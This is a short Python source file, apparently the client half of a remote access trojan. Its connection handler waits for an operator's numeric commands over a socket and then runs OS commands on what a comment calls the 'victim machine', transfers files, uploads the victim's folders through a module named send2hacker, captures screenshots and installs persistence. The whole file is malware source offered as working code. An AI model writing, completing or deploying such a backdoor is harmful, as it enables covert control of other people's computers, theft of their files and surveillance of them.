from clientcommand import executecommand
from download import download_file
from send2hacker import upload_files_folder
from screenshotcaptureclient import capture_screenshot
from clientpersistant import become_persistant
#handle the connections 
def handleConnection(my_socket):
    print("[+] Handling Connection")
    while True:
        user_input=my_socket.recv_data()
        print(user_input)
        #cmd     
        if user_input=="1":
            print("[+] running command on os")
            #execute command on victim machine
            executecommand(my_socket)

        elif user_input=="2":
            print("[+] Downloading files")    
            download_file(my_socket)

        elif user_input=="3":
            print("upload files folder")
            upload_files_folder(my_socket)    

        elif user_input=="4":
            print("taking screenshot")    
            capture_screenshot(my_socket)
        elif user_input=="5":
            become_persistant(my_socket)    
        elif user_input=="99":
            break
        else:
            print("[-] Invalid user options")
